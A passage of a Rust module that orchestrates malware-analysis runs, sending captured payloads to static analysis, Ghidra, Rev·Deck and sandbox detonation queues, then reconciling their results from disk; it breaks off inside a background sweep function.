//! Payload Workbench orchestrator: run creation, per-analyzer submission
//! dispatch, reconciliation against local-disk results, and child
//! cancel/retry actions. Ported from dashboard/workbench_orchestrator.go.
//!
//! Reconciliation reads results directly off disk (loadXResultsLocal in the
//! Go source), never through the ES mirrors any read-only listing endpoint
//! elsewhere in this tier would use — an ES mirror's import interval would
//! delay or miss the exact transition this exists to catch.
//!
//! Simplifications versus the Go source (also noted in the PR): no
//! `trueSHA256`/`staticAnalysisFor` — ghidra/revdeck submissions use
//! `run.payload_sha256` directly as the request-marker filename, same gap
//! Phase 3a's `payload_paths::resolve_payload_path` already has (a
//! Dionaea capture named by its on-disk MD5 rather than a real SHA-256
//! won't resolve correctly here yet). No cross-process flock on
//! `create_workbench_marker`'s queue-depth check — backend-service-mounted
//! is already a single-instance service by Phase 3a's own tier decision,
//! so the check-then-create race the flock guards against in the
//! multi-replica Go monolith doesn't apply here today; revisit if this
//! service is ever scaled beyond one replica.
//!
//! "deterministic" analyzer submissions run real, synchronous static
//! analysis (payload_static_analysis::analyze — Shannon entropy, IOC
//! extraction, and a small heuristic rule set) and complete immediately,
//! same as Go's submitWorkbenchChild does by calling analyzePayload inline
//! rather than spooling a request marker. Any pre-scanned YARA matches
//! (yara-analysis-v1, populated out of band by the networkless
//! analysis/yara/scanner.py service — see payload_static_analysis's module
//! doc comment) are folded in only on the initial submission path
//! (create_run), which is already async and has an AppState to query ES
//! with; the "retry" action runs through workbench_es::update_run's
//! inherently synchronous CAS-retry closure, which cannot await an ES
//! call, so a retried deterministic child recomputes without the YARA
//! boost — a narrower version of the same gap this file already documents
//! for ghidra/revdeck's trueSHA256 above.

use serde_json::{json, Value};

use crate::host_fs::{host, ListFilter, Root};
use crate::payload_kind::{classify_payload, PayloadClassification};
use crate::payload_paths::{read_payload_head, resolve_payload};
use crate::sandbox_submit::{create_request_marker, sandbox_request_root};
use crate::workbench_domain::{self, WorkbenchChild, WorkbenchRun, WorkbenchSelection};
use crate::AppState;

/// Fetches any pre-scanned YARA matches for `hash` out of yara-analysis-v1
/// — the same index payload_detail.rs and worker.rs already read, itself
/// populated by es-results-importer's "yara" source
/// (YARA_RESULTS_DIR/results.json), never computed in this crate. Uses a
/// `match` query rather than `term` on `yara.sha256`: worker.rs's own read
/// of this index avoids an exact-term filter on a hash field too (it scans
/// the 200 most recent hits and compares client-side), suggesting the
/// field's ES mapping isn't reliably `keyword`-typed; `match` degrades
/// gracefully either way. Best-effort: any ES error is treated as "no
/// matches yet" rather than failing the whole deterministic submission.
async fn fetch_yara_matches(es: &crate::es::Es, hash: &str) -> Vec<String> {
    let Ok(result) = es
        .search_index(
            &["yara-analysis-v1"],
            json!({"size": 1, "query": {"match": {"yara.sha256": hash}}}),
        )
        .await
    else {
        return Vec::new();
    };
    result["hits"]["hits"]
        .as_array()
        .and_then(|hits| hits.first())
        .and_then(|hit| hit["_source"]["yara"]["matches"].as_array())
        .map(|matches| matches.iter().filter_map(|m| m.as_str().map(str::to_string)).collect())
        .unwrap_or_default()
}

/// The request spool an analyzer's markers live in (#3582: named by root,
/// so the host gateway can serve it).
fn marker_root(analyzer_id: &str) -> Option<Root> {
    match analyzer_id {
        "ghidra" => Some(Root::GhidraRequests),
        "windows-sandbox" => Some(sandbox_request_root("windows")),
        "windows-ghosts" => Some(sandbox_request_root("ghosts")),
        "linux-sandbox" => Some(sandbox_request_root("linux")),
        "revdeck" => Some(Root::RevdeckRequests),
        _ => None,
    }
}

const MAX_SPOOL_READ_BYTES: u64 = 1024 * 1024;

/// loadGhidraResultsLocal / loadRevdeckResultsLocal: every `{sha256}{suffix}`
/// file in `root`, parsed, with `sha256` taken from the name. Files over
/// MAX_SPOOL_READ_BYTES or that do not parse are skipped, as before; one
/// `list` call carries the content, so a remote root costs one round trip.
fn local_named_results(root: Root, suffix: &str) -> Vec<Value> {
    let filter = ListFilter { suffix: suffix.into(), ..Default::default() }.with_content(MAX_SPOOL_READ_BYTES);
    host()
        .list(root, &filter)
        .unwrap_or_default()
        .into_iter()
        .filter_map(|entry| {
            let sha = entry.name.strip_suffix(suffix)?;
            if !crate::payload_paths::is_valid_hash(sha) {
                return None;
            }
            let mut value: Value = serde_json::from_slice(entry.content.as_deref()?).ok()?;
            if let Value::Object(ref mut map) = value {
                map.insert("sha256".into(), json!(sha));
            }
            Some(value)
        })
        .collect()
}

fn local_ghidra_results() -> Vec<Value> {
    local_named_results(Root::GhidraResults, "_ghidra.json")
}

fn local_revdeck_results() -> Vec<Value> {
    local_named_results(Root::RevdeckResults, "_revdeck.json")
}

fn sandbox_results_roots() -> Vec<Root> {
    host().distinct_configured(&[Root::SandboxResults, Root::WindowsSandboxResults, Root::GhostsSandboxResults])
}

fn sandbox_request_roots() -> Vec<Root> {
    host().distinct_configured(&[
        sandbox_request_root("linux"),
        sandbox_request_root("windows"),
        sandbox_request_root("ghosts"),
    ])
}

/// loadSandboxResultsLocal: `linux-*.json`/`windows-*.json` across every
/// configured backend's results dir, deduplicated by `job` (first
/// directory wins, mirrors Go). Also computes `incomplete` the same way
/// normalizeSandboxResult does, since the source JSON doesn't carry it
/// (Go's own json:"-" tag).
fn local_sandbox_results() -> Vec<Value> {
    let mut rows = Vec::new();
    let mut seen = std::collections::HashSet::new();
    let filter = ListFilter { suffix: ".json".into(), ..Default::default() }.with_content(MAX_SPOOL_READ_BYTES);
    for root in sandbox_results_roots() {
        let Ok(entries) = host().list(root, &filter) else {
            continue;
        };
        for entry in entries {
            if !(entry.name.starts_with("linux-") || entry.name.starts_with("windows-")) {
                continue;
            }
            let Some(mut value) = entry.content.as_deref().and_then(|body| serde_json::from_slice::<Value>(body).ok()) else {
                continue;
            };
            let sha = value["sha256"].as_str().unwrap_or("").to_string();
            let job = value["job"].as_str().unwrap_or("").to_string();
            if !crate::payload_paths::is_valid_hash(&sha)
                || job.is_empty()
                || !seen.insert(job.clone())
            {
                continue;
            }
            let run_status = value["run_status"].as_str().unwrap_or("").to_string();
            let timeout_reason = value["timeout_reason"].as_str().unwrap_or("");
            let exit_status = value["exit_status"].as_str().unwrap_or("");
            let incomplete = run_status == "failed"
                || !timeout_reason.is_empty()
                || matches!(exit_status, "unknown" | "guest-no-result" | "host-timeout");
            if let Value::Object(ref mut map) = value {
                map.insert("incomplete".into(), json!(incomplete));
            }
            rows.push(value);
        }
    }
    rows
}

/// loadSandboxStatus: merges every configured backend's status.json
/// (worker_state ranked idle < running < stale, counts summed, jobs
/// concatenated) plus a handoff scan of every request dir (*.request
/// files, stale if the oldest is >5min old).
fn sandbox_status() -> Value {
    fn rank(state: &str) -> i32 {
        match state {
            "idle" => 1,
            "running" => 2,
            "stale" => 3,
            _ => 0,
        }
    }
    #[derive(Default)]
    struct SandboxCounts {
        queued: i64,
        running: i64,
        completed: i64,
        failed: i64,
    }
    let mut worker_state = String::new();
    let mut counts = SandboxCounts::default();
    let mut jobs = Vec::new();
    for root in sandbox_results_roots() {
        match host().read_json(root, "status.json", MAX_SPOOL_READ_BYTES) {
            Some(value) => {
                let state = value["worker_state"].as_str().unwrap_or("").to_string();
                counts.queued += value["counts"]["queued"].as_i64().unwrap_or(0);
                counts.running += value["counts"]["running"].as_i64().unwrap_or(0);
                counts.completed += value["counts"]["completed"].as_i64().unwrap_or(0);
                counts.failed += value["counts"]["failed"].as_i64().unwrap_or(0);
                if let Some(more) = value["jobs"].as_array() {
                    jobs.extend(more.iter().cloned());
                }
                if rank(&state) > rank(&worker_state) {
                    worker_state = state;
                }
            }
            None if worker_state.is_empty() => worker_state = "unavailable".into(),
            None => {}
        }
    }
    let mut handoff = 0i64;
    let mut handoff_old = false;
    let requests = ListFilter { suffix: ".request".into(), ..Default::default() };
    for root in sandbox_request_roots() {
        let Ok(entries) = host().list(root, &requests) else {
            continue;
        };
        for entry in entries {
            handoff += 1;
            if entry.age().is_some_and(|age| age > std::time::Duration::from_secs(300)) {
                handoff_old = true;
            }
        }
    }
    json!({
        "worker_state": worker_state,
        "counts": {"queued": counts.queued, "running": counts.running, "completed": counts.completed, "failed": counts.failed},
        "handoff": handoff,
        "handoff_stale": handoff_old,
        "jobs": jobs,
    })
}

fn result_after(value: &str, threshold: &str) -> bool {
    let (Ok(value), Ok(threshold)) = (
        chrono::DateTime::parse_from_rfc3339(value),
        chrono::DateTime::parse_from_rfc3339(threshold),
    ) else {
        return false;
    };
    value >= threshold - chrono::Duration::seconds(1)
}

/// submitWorkbenchChild: dispatches one child to its analyzer's spool.
/// Mutates `child` in place; Err sets a caller-visible reason without
/// aborting the whole run (the caller records it on the child as `failed`).
fn submit_child(
    hash: &str,
    classification: &PayloadClassification,
    child: &mut WorkbenchChild,
    yara_matches: &[String],
) -> Result<(), String> {
    let now = chrono::Utc::now().to_rfc3339();
    child.updated_at = now;
    match child.analyzer_id.as_str() {
        "deterministic" => {
            let payload = resolve_payload(hash).map_err(|_| "deterministic analysis failed".to_string())?;
            let (data, real_size) = crate::payload_static_analysis::read_bounded(&payload)
                .map_err(|_| "deterministic analysis failed".to_string())?;
            let result =
                crate::payload_static_analysis::analyze(&data, real_size, yara_matches.to_vec());
            child.state = "completed".into();
            child.result_url = format!("/payload-analysis/{hash}");
            child.summary = format!(
                "risk {}/100 ({}); {} IOC(s); {} rule match(es)",
                result.risk_score,
                result.risk_level,
                result.iocs.len(),
                result.rules.len()
            );
            child.retryable = false;
            child.cancelable = false;
            Ok(())
        }
        "ghidra" => {
            create_marker(Root::GhidraRequests, hash)
                .map_err(|e| format!("Ghidra request spool unavailable: {e}"))?;
            child.target_hash = hash.to_string();
            child.state = "queued".into();
            child.reason = "waiting for the host-side Ghidra worker".into();
            child.cancelable = true;
            Ok(())
        }
        "linux-sandbox" => {
            if classification.platform == "Windows" || !classification.dynamic {
                return Err("payload is not compatible with the Linux sandbox".into());
            }
            create_marker(sandbox_request_root("linux"), hash)
                .map_err(|e| format!("Linux sandbox request spool unavailable: {e}"))?;
            child.state = "queued".into();
            child.reason = "waiting for the Linux sandbox handoff".into();
            child.cancelable = true;
            Ok(())
        }
        "windows-sandbox" => {
            if classification.platform != "Windows" || !classification.dynamic {
                return Err("payload is not compatible with the Windows sandbox".into());
            }
            create_marker(sandbox_request_root("windows"), hash)
                .map_err(|e| format!("Windows sandbox request spool unavailable: {e}"))?;
            child.state = "queued".into();
            child.reason = "waiting for the Windows sandbox handoff".into();
            child.cancelable = true;
            Ok(())
        }
        "windows-ghosts" => {
            if classification.platform != "Windows" || !classification.dynamic {
                return Err("payload is not compatible with the Windows detonation route".into());
            }
            create_marker(sandbox_request_root("ghosts"), hash)
                .map_err(|e| format!("GHOSTS sandbox request spool unavailable: {e}"))?;
            child.state = "queued".into();
            child.reason = "waiting for the WAN-permitted GHOSTS sandbox handoff".into();
            child.cancelable = true;
            Ok(())
        }
        "revdeck" => {
            create_marker(Root::RevdeckRequests, hash)
                .map_err(|e| format!("Rev\u{b7}Deck request spool unavailable: {e}"))?;
            child.target_hash = hash.to_string();
            child.state = "queued".into();
            child.reason = "waiting for the host-side Rev\u{b7}Deck drain".into();
            child.cancelable = true;
            Ok(())
        }
        _ => Err("analyzer adapter is not implemented".to_string()),
    }
}

/// createWorkbenchMarker: queue-depth-capped marker creation (no
/// cross-process flock — see module doc comment).
fn create_marker(root: Root, hash: &str) -> Result<(), String> {
    if !host().configured(root) || !crate::payload_paths::is_valid_hash(hash) {
        return Err("backend is not configured".into());
    }
    let pending = host()
        .list(root, &ListFilter::files_with_suffix(".request"))
        .map(|entries| entries.len())
        .map_err(|e| e.to_string())?;
    if pending >= workbench_domain::MAX_QUEUE_DEPTH {
        return Err("queue capacity reached".into());
    }
    create_request_marker(root, hash)
}

pub struct CreateRunRequest {
    pub payload_sha256: String,
    pub owner: String,
    pub recipe_id: String,
    pub recipe_revision: i64,
    pub recipe_name: String,
    pub analyzers: Vec<WorkbenchSelection>,
}

pub enum CreateRunError {
    Validation(String),
    NotFound,
    Storage(anyhow::Error),
}

pub async fn create_run(
    state: &AppState,
    request: CreateRunRequest,
) -> Result<(WorkbenchRun, bool), CreateRunError> {
    let hash = request.payload_sha256.trim().to_lowercase();
    if !crate::payload_paths::is_valid_hash(&hash) {
        return Err(CreateRunError::Validation("invalid payload hash".into()));
    }
    let payload = resolve_payload(&hash).map_err(|_| CreateRunError::NotFound)?;
    let head = read_payload_head(&payload)
        .map_err(|_| CreateRunError::Validation("captured payload is unreadable".into()))?;
    let classification = classify_payload(&head);

    let (mut selections, recipe_id, recipe_revision, recipe_name) = if !request.recipe_id.is_empty()
    {
        let recipe = crate::workbench_es::recipe(
            &state.es,
            &request.recipe_id,
            request.recipe_revision,
            &request.owner,
        )
        .await
        .ok_or(CreateRunError::NotFound)?;
        (recipe.analyzers, recipe.id, recipe.revision, recipe.name)
    } else {
        let name = if request.recipe_name.trim().is_empty() {
            "One-off analysis".to_string()
        } else {
            request.recipe_name
        };
        (request.analyzers, "one-off".to_string(), 1, name)
    };
    selections =
        workbench_domain::validate_selections(selections).map_err(CreateRunError::Validation)?;

    let idempotency = workbench_domain::idempotency_key(
        &hash,
        &recipe_id,
        recipe_revision,
        &request.owner,
        &selections,
    );
    let run_id = format!("run_{idempotency}");

    if let Some(existing) = crate::workbench_es::find_run(&state.es, &run_id, &request.owner).await
    {
        return Ok((existing, true));
    }
    let count = crate::workbench_es::count_runs(&state.es)
        .await
        .map_err(CreateRunError::Storage)?;
    if count >= workbench_domain::MAX_RUNS {
        return Err(CreateRunError::Validation(
            "analysis run retention limit reached; archive old dashboard state before creating more runs".into(),
        ));
    }

    let now = chrono::Utc::now().to_rfc3339();
    let registry = workbench_domain::registry(&classification);
    // Fetched once, up front, only when a "deterministic" child is
    // actually selected — see fetch_yara_matches's own doc comment for why
    // this has to happen here rather than inside submit_child.
    let yara_matches = if selections.iter().any(|s| s.analyzer_id == "deterministic") {
        fetch_yara_matches(&state.es, &hash).await
    } else {
        Vec::new()
    };
    let mut children = Vec::with_capacity(selections.len());
    for selection in &selections {
        let analyzer = workbench_domain::analyzer_by_id(&registry, &selection.analyzer_id);
        let (display_name, detonates, gpu, local_only) = analyzer
            .map(|a| (a.display_name.clone(), a.detonates, a.gpu, a.local_only))
            .unwrap_or_default();
        let deadline =
            chrono::Utc::now() + chrono::Duration::seconds(selection.options.timeout_seconds);
        let queue_deadline =
            chrono::Utc::now() + chrono::Duration::seconds(selection.options.max_queue_age_seconds);
        let mut child = WorkbenchChild {
            analyzer_id: selection.analyzer_id.clone(),
            display_name,
            state: "queued".into(),
            options: selection.options.clone(),
            created_at: now.clone(),
            updated_at: now.clone(),
            deadline: deadline.to_rfc3339(),
            queue_deadline: queue_deadline.to_rfc3339(),
            attempts: 1,
            detonates,
            gpu,
            local_only,
            ..Default::default()
        };
        match analyzer {
            Some(a) if !a.applicable || !a.available => {
                child.state = "skipped".into();
                child.reason = a.reason.clone();
            }
            _ => {
                if let Err(error) = submit_child(&hash, &classification, &mut child, &yara_matches) {
                    child.state = "failed".into();
                    child.reason = error;
                    child.retryable = child.attempts <= child.options.retry_limit;
                }
            }
        }
        children.push(child);
    }

    let mut run = WorkbenchRun {
        schema_version: workbench_domain::SCHEMA_VERSION,
        id: run_id,
        payload_sha256: hash,
        payload_kind: classification.code,
        owner: request.owner,
        recipe_id,
        recipe_revision,
        recipe_name,
        recipe_snapshot: selections,
        idempotency_key: idempotency,
        state: "queued".into(),
        created_at: now.clone(),
        updated_at: now,
        children,
    };
    workbench_domain::update_run_state(&mut run);
    crate::workbench_es::create_or_reuse_run(&state.es, run)
        .await
        .map_err(CreateRunError::Storage)
}

/// reconcileWorkbenchRun: re-checks each non-terminal child against local
/// results/status, applies queue/run timeouts. Returns (run, changed).
pub fn reconcile_run(mut run: WorkbenchRun) -> (WorkbenchRun, bool) {
    if run
        .children
        .iter()
        .all(|c| workbench_domain::is_terminal_state(&c.state))
    {
        return (run, false);
    }
    let now = chrono::Utc::now();
    let now_str = now.to_rfc3339();
    let ghidra_results = local_ghidra_results();
    let revdeck_results = local_revdeck_results();
    let sandbox_results = local_sandbox_results();
    let status = sandbox_status();

    for child in run.children.iter_mut() {
        if workbench_domain::is_terminal_state(&child.state) {
            continue;
        }
        child.stale = false;
        match child.analyzer_id.as_str() {
            "ghidra" => {
                let target = if child.target_hash.is_empty() {
                    run.payload_sha256.clone()
                } else {
                    child.target_hash.clone()
                };
                if let Some(result) = ghidra_results.iter().find(|r| {
                    r["sha256"].as_str() == Some(target.as_str())
                        && result_after(r["completed_at"].as_str().unwrap_or(""), &child.created_at)
                }) {
                    child.updated_at = now_str.clone();
                    child.cancelable = false;
                    child.result_url = format!("/ghidra/{target}");
                    if result["exit_status"].as_str() == Some("error") {
                        child.state = "failed".into();
                        child.reason = result["error"]
                            .as_str()
                            .filter(|s| !s.is_empty())
                            .unwrap_or("Ghidra analysis failed")
                            .to_string();
                        child.retryable = child.attempts <= child.options.retry_limit;
                    } else {
                        child.state = "completed".into();
                        child.reason.clear();
                        let functions =
                            result["functions"].as_array().map(|a| a.len()).unwrap_or(0);
                        let imports = result["imports"].as_array().map(|a| a.len()).unwrap_or(0);
                        let findcrypt =
                            result["findcrypt"].as_array().map(|a| a.len()).unwrap_or(0);
                        child.summary = format!(
                            "{functions} functions; {imports} imports; {findcrypt} crypto hit(s)"
                        );
                    }
                    continue;
                }
                if let Some((state, reason)) = marker_state(Root::GhidraRequests, &target) {
                    child.state = state.clone();
                    child.reason = reason;
                    child.cancelable = state == "queued";
                    if state == "failed" {
                        child.retryable = child.attempts <= child.options.retry_limit;
                    }
                }
                child.stale =
                    workbench_domain::spool_status_stale(Root::GhidraResults, Root::GhidraRequests);
            }
            "revdeck" => {
                let target = if child.target_hash.is_empty() {
                    run.payload_sha256.clone()
                } else {
                    child.target_hash.clone()
                };
                if let Some(result) = revdeck_results.iter().find(|r| {
                    r["sha256"].as_str() == Some(target.as_str())
                        && result_after(r["completed_at"].as_str().unwrap_or(""), &child.created_at)
                }) {
                    child.updated_at = now_str.clone();
                    child.cancelable = false;
                    child.result_url = format!("/revdeck/{target}");
                    let revdeck = &result["revdeck"];
                    if result["exit_status"].as_str() == Some("error") || revdeck.is_null() {
                        child.state = "failed".into();
                        child.reason = result["error"]
                            .as_str()
                            .filter(|s| !s.is_empty())
                            .unwrap_or("Rev\u{b7}Deck produced no usable answer")
                            .to_string();
                        child.retryable = child.attempts <= child.options.retry_limit;
                    } else {
                        child.state = "completed".into();
                        child.reason.clear();
                        child.summary = format!(
                            "{} ({}): {} tool call(s)",
                            revdeck["workflow"].as_str().unwrap_or(""),
                            revdeck["status"].as_str().unwrap_or(""),
                            revdeck["tool_calls"].as_i64().unwrap_or(0)
                        );
                    }
                    continue;
                }
                if let Some((state, reason)) = marker_state(Root::RevdeckRequests, &target) {
                    child.state = state.clone();
                    child.reason = reason;
                    child.cancelable = state == "queued";
                    if state == "failed" {
                        child.retryable = child.attempts <= child.options.retry_limit;
                    }
                }
            }
            "linux-sandbox" | "windows-sandbox" | "windows-ghosts" => {
                let wanted_prefix = match child.analyzer_id.as_str() {
                    "windows-sandbox" => "windows-",
                    "windows-ghosts" => "windows-ghosts-",
                    _ => "linux-",
                };
                let found = sandbox_results.iter().find(|r| {
                    let job = r["job"].as_str().unwrap_or("");
                    if child.analyzer_id == "windows-sandbox" && job.starts_with("windows-ghosts-")
                    {
                        return false;
                    }
                    r["sha256"].as_str() == Some(run.payload_sha256.as_str())
                        && job.starts_with(wanted_prefix)
                        && (result_after(
                            r["requested_at"].as_str().unwrap_or(""),
                            &child.created_at,
                        ) || result_after(
                            r["completed_at"].as_str().unwrap_or(""),
                            &child.created_at,
                        ))
                });
                if let Some(result) = found {
                    child.updated_at = now_str.clone();
                    child.cancelable = false;
                    child.result_url = format!("/sandbox/{}", result["job"].as_str().unwrap_or(""));
                    let incomplete = result["incomplete"].as_bool().unwrap_or(false);
                    if incomplete || result["run_status"].as_str() == Some("failed") {
                        child.state = "failed".into();
                        child.reason = result["failure_reason"]
                            .as_str()
                            .filter(|s| !s.is_empty())
                            .or_else(|| result["timeout_reason"].as_str().filter(|s| !s.is_empty()))
                            .unwrap_or("sandbox analysis failed")
                            .to_string();
                        child.retryable = child.attempts <= child.options.retry_limit;
                    } else {
                        child.state = "completed".into();
                        child.reason.clear();
                        let techniques = result["techniques"]
                            .as_array()
                            .map(|a| a.len())
                            .unwrap_or(0);
                        child.summary = format!(
                            "risk {}/100 ({}); {} ATT&CK technique(s)",
                            result["risk_score"].as_i64().unwrap_or(0),
                            result["risk_level"].as_str().unwrap_or(""),
                            techniques
                        );
                    }
                    continue;
                }
                if let Some(job) = status["jobs"].as_array().into_iter().flatten().find(|job| {
                    job["sha256"].as_str() == Some(run.payload_sha256.as_str())
                        && result_after(
                            job["requested_at"].as_str().unwrap_or(""),
                            &child.created_at,
                        )
                }) {
                    child.state = normalize_queue_state(job["state"].as_str().unwrap_or(""));
                    child.reason = "reported by the sandbox worker".into();
                    child.cancelable = false;
                }
                if child.state == "queued"
                    && !marker_root(&child.analyzer_id).is_some_and(|root| {
                        host().configured(root) && marker_exists(root, &run.payload_sha256, ".request")
                    })
                {
                    child.state = "claimed".into();
                    child.reason = "accepted by the host-side handoff".into();
                    child.cancelable = false;
                }
                let worker_state = status["worker_state"].as_str().unwrap_or("");
                child.stale =
                    worker_state == "stale" || status["handoff_stale"].as_bool().unwrap_or(false);
            }
            _ => {}
        }
        if child.state == "queued" && now_str.as_str() > child.queue_deadline.as_str() {
            child.state = "timed_out".into();
            child.reason = "maximum queue age exceeded".into();
            child.cancelable = false;
            child.retryable = child.attempts <= child.options.retry_limit;
        } else if !workbench_domain::is_terminal_state(&child.state)
            && now_str.as_str() > child.deadline.as_str()
        {
            child.state = "timed_out".into();
            child.reason = "analysis timeout exceeded".into();
            child.cancelable = false;
            child.retryable = child.attempts <= child.options.retry_limit;
        }
        child.updated_at = now_str.clone();
    }
    let _ = now;
    workbench_domain::update_run_state(&mut run);
    (run, true)
}

fn normalize_queue_state(state: &str) -> String {
    match state.to_lowercase().trim() {
        "queued" | "pending" => "queued",
        "claimed" => "claimed",
        "running" => "running",
        "failed" | "error" => "failed",
        _ => "running",
    }
    .to_string()
}

const MARKER_STATES: &[(&str, &str, &str)] = &[
    (
        ".request.running",
        "running",
        "claimed by the host-side worker",
    ),
    (".request", "queued", "waiting for the host-side worker"),
    (
        ".request.failed",
        "failed",
        "host-side worker marked the request failed",
    ),
    (
        ".request.invalid",
        "failed",
        "host-side worker rejected the request",
    ),
    (
        ".request.missing-sample",
        "failed",
        "host-side worker could not resolve the captured sample",
    ),
];

fn marker_exists(root: Root, hash: &str, suffix: &str) -> bool {
    if !crate::payload_paths::is_valid_hash(hash) {
        return false;
    }
    host().stat(root, &format!("{hash}{suffix}")).map(|entry| !entry.is_dir).unwrap_or(false)
}

/// One `list` per call: a remote spool would otherwise cost one round trip
/// per possible marker suffix.
fn marker_state(root: Root, hash: &str) -> Option<(String, String)> {
    if !crate::payload_paths::is_valid_hash(hash) {
        return None;
    }
    let names: std::collections::HashSet<String> = host()
        .list(root, &ListFilter { prefix: hash.into(), files_only: true, ..Default::default() })
        .ok()?
        .into_iter()
        .map(|entry| entry.name)
        .collect();
    MARKER_STATES
        .iter()
        .find(|(suffix, _, _)| names.contains(&format!("{hash}{suffix}")))
        .map(|(_, state, reason)| (state.to_string(), reason.to_string()))
}

pub async fn get_run(
    state: &AppState,
    id: &str,
    owner: &str,
) -> Result<WorkbenchRun, crate::workbench_es::UpdateRunError> {
    crate::workbench_es::update_run(&state.es, id, owner, |run| {
        let (reconciled, changed) = reconcile_run(std::mem::take(run));
        *run = reconciled;
        Ok(changed)
    })
    .await
}

pub async fn child_action(
    state: &AppState,
    run_id: &str,
    analyzer_id: &str,
    action: &str,
    owner: &str,
) -> Result<WorkbenchRun, crate::workbench_es::UpdateRunError> {
    crate::workbench_es::update_run(&state.es, run_id, owner, |run| {
        let (reconciled, _) = reconcile_run(std::mem::take(run));
        *run = reconciled;
        let Some(index) = run
            .children
            .iter()
            .position(|c| c.analyzer_id == analyzer_id)
        else {
            return Err("analyzer not found on this run".to_string());
        };
        match action {
            "cancel" => {
                let cancelable = run.children[index].cancelable;
                let queued = run.children[index].state == "queued";
                // A child that has outlived its own queue deadline is stuck by
                // definition, and refusing to cancel it leaves the operator no
                // way out at all. Observed live: a revdeck child sat "queued"
                // for 24 hours against a 30-minute max_queue_age, with
                // updated_at never advancing, because nothing reconciles a run
                // except an explicit fetch of that run -- there is no sweeper.
                // Cancel then compounded it: child_action reconciles first, so
                // the same call moved the child to timed_out and *then*
                // rejected it for no longer being queued.
                let now = chrono::Utc::now().to_rfc3339();
                let child_state = run.children[index].state.clone();
                let expired = !workbench_domain::is_terminal_state(&child_state)
                    && (now.as_str() > run.children[index].queue_deadline.as_str()
                        || now.as_str() > run.children[index].deadline.as_str());
                if !expired && (!cancelable || !queued) {
                    return Err(format!(
                        "cannot cancel a child in state \"{child_state}\""
                    ));
                }
                let target_hash = if run.children[index].target_hash.is_empty() {
                    run.payload_sha256.clone()
                } else {
                    run.children[index].target_hash.clone()
                };
                let Some(root) = marker_root(analyzer_id).filter(|root| host().configured(*root)) else {
                    return Err("analyzer does not support cancellation".to_string());
                };
                match host().remove(root, &format!("{target_hash}.request")) {
                    Ok(()) => {}
                    // No marker left. Normally that means a worker claimed the
                    // request and cancelling would race it -- but once the
                    // child has outlived its deadline, "claimed" has stopped
                    // being a useful story: whatever took it is not coming
                    // back, and the operator still needs the run to end.
                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                        if !expired {
                            return Err(
                                "request was already claimed and cannot be cancelled".to_string()
                            );
                        }
                    }
                    Err(error) => return Err(error.to_string()),
                }
                let child = &mut run.children[index];
                child.state = "cancelled".into();
                child.reason = "queued request cancelled".into();
                child.cancelable = false;
                child.retryable = child.attempts <= child.options.retry_limit;
            }
            "retry" => {
                let retryable = run.children[index].retryable;
                let attempts_ok =
                    run.children[index].attempts <= run.children[index].options.retry_limit;
                if !retryable || !attempts_ok {
                    return Err("retry limit reached or child is not retryable".to_string());
                }
                let payload = resolve_payload(&run.payload_sha256)
                    .map_err(|_| "captured payload not found".to_string())?;
                let head = read_payload_head(&payload).map_err(|e| e.to_string())?;
                let classification = classify_payload(&head);
                let now = chrono::Utc::now();
                {
                    let child = &mut run.children[index];
                    child.attempts += 1;
                    child.created_at = now.to_rfc3339();
                    child.deadline = (now
                        + chrono::Duration::seconds(child.options.timeout_seconds))
                    .to_rfc3339();
                    child.queue_deadline = (now
                        + chrono::Duration::seconds(child.options.max_queue_age_seconds))
                    .to_rfc3339();
                    child.reason.clear();
                    child.summary.clear();
                    child.result_url.clear();
                    child.stale = false;
                    child.retryable = false;
                    child.cancelable = false;
                }
                let hash = run.payload_sha256.clone();
                let child = &mut run.children[index];
                // No YARA fetch on retry — see this file's module doc
                // comment and fetch_yara_matches' own comment for why.
                if let Err(error) = submit_child(&hash, &classification, child, &[]) {
                    child.state = "failed".into();
                    child.reason = error;
                    child.retryable = child.attempts <= child.options.retry_limit;
                }
            }
            _ => return Err("unknown child action".to_string()),
        }
        workbench_domain::update_run_state(run);
        Ok(true)
    })
    .await
}

/// How many runs one pass will reconcile.
///
/// Bounded because "every non-terminal run" is unbounded over time, and an
/// unbounded sweep is the kind of background job that is fine until the day it
/// is not. Oldest-first, so anything skipped is picked up on the next pass
/// rather than starved.
const SWEEP_LIMIT: usize = 200;

fn sweep_interval() -> std::time::Duration {
    let secs = std::env::var("WORKBENCH_RECONCILE_INTERVAL_SECONDS")
        .ok()
        .and_then(|value| value.parse::<u64>().ok())
        .filter(|value| *value > 0)
        .unwrap_or(60);
    std::time::Duration::from_secs(secs)
}

/// Reconcile runs nobody is looking at.
///
/// #1801: `reconcile_run` is correct -- it times out a child that outlives its
/// queue deadline, and there is a test for it -- but it only ever ran inside
/// `get_run` and `child_action`, both request-driven. A run whose worker never
/// reported back therefore sat in its last-written state indefinitely.
/// Measured on a real document: `updated_at` still equal to `created_at` a
/// full day later, against a `queue_deadline` 30 minutes after creation. The
/// timeout that exists to prevent exactly that had never been evaluated.
///
/// Must run on the tier that has the analyzer spool mounts. `marker_state`
/// reads those directories to decide whether a request is still queued,
/// claimed or done; without them every marker lookup returns None and the
/// sweep would conclude the opposite of the truth about every run it touches.
///
/// Reconciles as each run's own recorded owner rather than bypassing the
/// ownership check, so this reuses `update_run`'s optimistic-concurrency path
/// exactly and introduces no second way to write a run.
pub async fn workbench_reconcile_loop(state: AppState) {
    let mut ticker = tokio::time::interval(sweep_interval());
    ticker.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    loop {
        ticker.tick().await;
        sweep_once(&state).await;
    }
}

async fn sweep_once(state: &AppState) {
    let body = serde_json::json!({
        "size": SWEEP_LIMIT,
        "query": {"bool": {"must_not": [
            {"terms": {"state": workbench_domain::TERMINAL_STATES}}
        ]}},
        // Oldest first: the runs most likely to have outlived a deadline are
        // the ones nobody has touched in longest.
        "sort": [{"updated_at": {"order": "asc"}}],
        "_source": ["id", "owner"]
    });
    let result = match state
        .es
        .search_index(&[crate::workbench_es::RUNS_INDEX], body)
        .await
    {
        Ok(value) => value,
        Err(error) => {
            tracing::warn!(%error, "workbench-reconcile: query failed");
            return;
        }
    };

    let targets: Vec<(String, String)> = result["hits"]["hits"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|hit| {
            let source = &hit["_source"];
            let id = source["id"].as_str()?.to_string();
            let owner = source["owner"].as_str().unwrap_or_default().to_string();
            Some((id, owner))
        })
        .collect();
    if targets.is_empty() {
        return;
    }

    let mut changed = 0usize;
    for (id, owner) in &targets {
        // #2181: one run whose stored document panics the reconciler costs
